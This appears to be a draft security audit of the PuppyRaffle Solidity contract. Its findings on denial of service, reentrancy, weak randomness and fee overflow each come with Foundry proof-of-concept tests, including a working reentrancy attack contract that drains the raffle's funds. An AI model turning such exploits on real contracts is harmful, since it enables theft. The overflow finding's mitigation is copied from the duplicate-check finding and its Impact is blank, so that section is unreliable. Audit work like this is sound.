### [S-#] Looping through players array to check for duplicate players in `PuppyRaffle::enterRaffle` is vulnerable to a denial of service (DoS) attack.  

**Description:** As each new player is added to the `PuppyRaffle::players` array, the function must perform a nested loop over the entire array to check for duplicates. This makes each interaction more gas expensive, since it has to do more comparisons. If the array is long enough, it results in an expensive gas execution of the transaction reaching a dramatically expensive cost for the last players. 

```solidity
// @audit DoS Attack
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas cost for each new player will increase, making it prohibitively expensive for new users to enter once the array is long enough. This discourages later users from entering and causes a rush at the start of the raffle to be one of the first entrants in the queue. Also can happen that the gas required by `PuppyRaffle::enterRaffle` exceeds the block gas limit, permanently blocking any further entries.  

**Proof of Concept:** In the following test we can see how this gas increment is applied when we have two sets of 100 players.  

In this case we get as outputs:  

```
-Gas spent for the first 100 players: 6503222
-Gas spent for the second 100 players: 18995459
```

That's almost 3x more expensive.  

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`.

```solidity
function test_denialOfService() public {
        vm.txGasPrice(1);

        // We enter our first 100 players
        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }

        // We calculate the gas spent
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        uint256 gasEnd = gasleft();

        uint256 gasSpentOne = gasStart - gasEnd;
        console.log("Gas spent for the first 100 players: ", gasSpentOne);

        // Next 100 players
        address[] memory playersTwo = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(i + numPlayers);
        }

        // We calculate the gas spent
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
        gasEnd = gasleft();

        uint256 gasSpentTwo = gasStart - gasEnd;
        console.log("Gas spent for the second 100 players: ", gasSpentTwo);

        assert(gasSpentOne < gasSpentTwo);
    }
```  

</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider allowing duplicates. Users can create new wallet addresses anyway, so checking for duplicates does not stop the same user from entering multiple times.
2. Consider using a mapping with a require to check for duplicates. This eliminates the nested for loop and, as a consequence, the DoS vector.

```diff
    address public previousWinner;
+   uint256 public raffleId = 0;

    ...

    mapping(uint256 => string) public rarityToName;
+   mapping(address => uint256) public addressToRaffleId;

    ...
    
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

        for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+           addressToRaffleId[newPlayers[i]] = raffleId;
            players.push(newPlayers[i]);
        }

-       // Check for duplicates
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }

    ...

    function selectWinner() external {
+       raffleId = raffleId + 1;
```  


### [S-#] `PuppyRaffle::refund` performs an external call before updating the state, making it vulnerable to a reentrancy attack.   

**Description:** `PuppyRaffle::refund` does not respect the CEI pattern. The low-level call inside `payable(msg.sender).sendValue(entranceFee)` is executed before the player is removed from `players` array. This hands control to the attack contract creating the possibility to a reentrancy attack which allows the attacker to drain all the funds.  

```solidity
// @audit Reentrancy attack
@>      payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
```  

**Impact:** This creates an opportunity for a malicious user to drain all the funds held by the contract through a reentrancy attack.

**Proof of Concept:** In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. The test adds a malicious contract which enters the raffle through `attackContract.startAttack();`.  This malicious contract enters the raffle and fires a refund triggering the low-level call in `PuppyRaffle::refund`. That hands control over to `ReentrancyContract::receive` firing the reentrancy and emptying the `PuppyRaffle` contract in the process.  

In this case we get as outputs:  

```
=== INITIAL STATE ===
Initial attacker balance  : 1000000000000000000
Initial victim balance    : 4000000000000000000
=== FINAL STATE ===
Final attacker balance    : 5000000000000000000
Final victim balance      : 0
Reentrancy was successful!
```  

The contract is fully drained.  

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`.  

```solidity
...

    function test_reentrancyRefund() public playersEntered {
        ReentrancyContract attackContract = new ReentrancyContract(puppyRaffle);
        vm.deal(address(attackContract), 1 ether);

        uint256 initialAttackerBalance = address(attackContract).balance;
        uint256 initialVictimBalance = address(puppyRaffle).balance;
        console2.log("=== INITIAL STATE ===");
        console2.log("Initial attacker balance  : ", initialAttackerBalance);
        console2.log("Initial victim balance    : ", initialVictimBalance);

        attackContract.startAttack();

        uint256 finalAttackerBalance = address(attackContract).balance;
        uint256 finalVictimBalance = address(puppyRaffle).balance;
        console2.log("=== FINAL STATE ===");
        console2.log("Final attacker balance    : ", finalAttackerBalance);
        console2.log("Final victim balance      : ", finalVictimBalance);

        if(initialAttackerBalance < finalAttackerBalance) {
            console2.log("Reentrancy was successful!");
        } else {
            console2.log("Reentrancy failed");
        }
    }
}

// This goes outside the PuppyRaffleTest contract
contract ReentrancyContract {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function startAttack() external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```  
</details>  
  

**Recommended Mitigation:** There are three main recommendations:  

1. Consider following the CEI pattern, which updates state before the external call, removing any reentrancy possibility. Example:  

```diff
    function refund(uint256 playerIndex) public {
+       // Checks
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);

+       // Effects
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

+       // Interactions
+       payable(msg.sender).sendValue(entranceFee);
    }
```  

2. Consider using a battle-tested library such as [`ReentrancyGuard`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) from OpenZeppelin. Example:  

```diff
    ...

    import {Base64} from "lib/base64/base64.sol";
+   import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

    ...
    
-   contract PuppyRaffle is ERC721, Ownable {
+   contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    
    ...

-   function refund(uint256 playerIndex) public {
+   function refund(uint256 playerIndex) public nonReentrant {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```  

3. Consider adding a new lock variable, like a bool, which locks the entrance at the start of the function and unlocks it at the end. Example:  

```diff
    ...

    address public previousWinner;
+   bool public locked;

    ...

    function refund(uint256 playerIndex) public {
+       if (locked) revert();
+       locked = true;

        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
+       locked = false;
    }
```  


### [S-#] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to predict the winner and the minted puppy's rarity.   

**Description:** `PuppyRaffle::selectWinner` uses as a source of randomness: `msg.sender`, `block.timestamp` and `block.difficulty` to select the `PuppyRaffle::winnerIndex` and `PuppyRaffle::rarity` — none of which is a safe source of randomness. `block.timestamp` and `block.difficulty` can be known within the block and `msg.sender` can be manipulated by an attacker — by grinding addresses off-chain — until the hash produces the outcome they want, then submit the transaction.

```solidity
// @audit notRandom
@>  uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    ...

@>  uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```  

Because `msg.sender` is fully controlled by the caller, an attacker does not need to wait for favorable conditions: within a single block, where `block.timestamp` and `block.difficulty` are already known, the search space is tiny (`PuppyRaffle::players.length` outcomes for the winner, `100` for the rarity), so grinding an address that yields the desired result is trivial.

**Impact:** Any user can predict the outcome for the winner and rarity and win the prize pool and the rarity they want. As a result, honest users have no real chance of winning, which makes the raffle fundamentally broken rather than merely unfair. `PuppyRaffle::winnerIndex` weak randomness is a high severity while `PuppyRaffle::rarity` is a medium.

**Proof of Concept:** 
<details> <summary>PoC 1 — Predictable winner</summary>  

In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. Using the same non-random calculation in `PuppyRaffle.sol` we store the expected winner before firing `PuppyRaffle::selectWinner`. After firing `PuppyRaffle::selectWinner` we store that real winner and compare it to the expected one confirming that both match. This means that someone can fire `PuppyRaffle::selectWinner` controlling the `msg.sender` and combining with the other two known inputs to get its address index.  

In this case we get as outputs:  

```
The expected winner is    :  0x0000000000000000000000000000000000000004
The real winner is        :  0x0000000000000000000000000000000000000004
Expected winner == real winner
```  

The contract sends the reward to a predetermined user.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomWinnerIndex() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // `playersEntered` enters 4 users, so players.length is hardcoded here
    // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
    uint256 expectedIndexWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    address expectedWinner = puppyRaffle.players(expectedIndexWinner);

    puppyRaffle.selectWinner();

    address realWinner = puppyRaffle.previousWinner();
    console2.log("The expected winner is    : ", expectedWinner);
    console2.log("The real winner is        : ", realWinner);

    if (expectedWinner == realWinner) console2.log("Expected winner == real winner");
    assertEq(expectedWinner, realWinner, "winner was not predictable");
}
```  
</details>  

<details> <summary>PoC 2 — Predictable puppy rarity</summary>  

Same setup as PoC 1. We calculate the expected rarity with the same parameter as we know the `PuppyRaffle::rarity` will do. Then `PuppyRaffle::selectWinner` its fired and we store the real rarity outcome. When comparing it against each other we get both are equal. Meaning `PuppyRaffle::rarity` uses weak and predictable randomness which someone can take advantage selecting the rarity they want.  

In this case we get as outputs:  

```
Expected rarity :  70
Actual rarity   :  70
Expected rarity == actual rarity
```  

The contract gives a predefined rarity.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomRarity() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // Reproduce the on-chain calc: `address(this)` is the msg.sender of selectWinner()
    uint256 rarity = uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;
    uint256 expectedRarity;
    if (rarity <= puppyRaffle.COMMON_RARITY()) {
        expectedRarity = puppyRaffle.COMMON_RARITY();
    } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
        expectedRarity = puppyRaffle.RARE_RARITY();
    } else {
        expectedRarity = puppyRaffle.LEGENDARY_RARITY();
    }

    uint256 tokenId = puppyRaffle.totalSupply(); // 0 for the first mint

    puppyRaffle.selectWinner();

    uint256 actualRarity = puppyRaffle.tokenIdToRarity(tokenId);
    console2.log("Expected rarity : ", expectedRarity);
    console2.log("Actual rarity   : ", actualRarity);
    if (expectedRarity == actualRarity) console2.log("Expected rarity == actual rarity");
    assertEq(actualRarity, expectedRarity, "rarity was not predictable");
}
```  
</details>  

**Recommended Mitigation:** Use [Chainlink VRF](https://docs.chain.link/vrf) for both the winner index and the rarity roll. This external oracle provides verifiable on-chain randomness. It requires two steps: request the random number and then a callback in `fulfillRandomWords`. It will also be necessary to restructure `PuppyRaffle::selectWinner` for proper functionality.  

No block variable (`timestamp`, `prevrandao`, `blockhash`, `difficulty`, `number`) should ever be used as a source of randomness on-chain.  


### [S-#] Collecting total fees in `PuppyRaffle::totalFees` being it an uint64 variable might cause a silence overflow.  

**Description:** `PuppyRaffle::totalFees` is declared as an uint64 variable instead of an uint256. This causes a very low `players.length` to do an overflow resetting its counting corrupting the real accounting.

```solidity
@>  uint64 public totalFees = 0;

    ...
// @audit overflow
@>  totalFees = totalFees + uint64(fee);
```  

**Impact:**   

**Proof of Concept:** In the following test we clearly see how the real output — uint64 variable — overflows without any warning.

In this case we get as outputs:  

```
The expected total fees are    : 19000000000000000000
The real total fees are        : 553255926290448384
```

uint64 variable completely resets starting its counting again.  

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`.

```solidity
function test_feeOverflow() public {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    uint256 numPlayers = 95;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i + 1_000_000);
    }

    // Manual calculation in uin256
    uint256 expectedTotalAmountCollected = players.length * entranceFee;
    uint256 expectedFee = (expectedTotalAmountCollected * 20) / 100;
    uint256 expectedTotalFees = expectedFee;
        
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
    puppyRaffle.selectWinner();

    // Real result in uint64
    uint64 realTotalFees = puppyRaffle.totalFees();

    console2.log("The expected total fees are    : ", expectedTotalFees);
    console2.log("The real total fees are        : ", uint256(realTotalFees));
    assertLt(uint256(realTotalFees), expectedTotalFees, "Real total fees isn't minor than expected one");
}
```  
</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider allowing duplicates. Users can create new wallet addresses anyway, so checking for duplicates does not stop the same user from entering multiple times.
2. Consider using a mapping with a require to check for duplicates. This eliminates the nested for loop and, as a consequence, the DoS vector.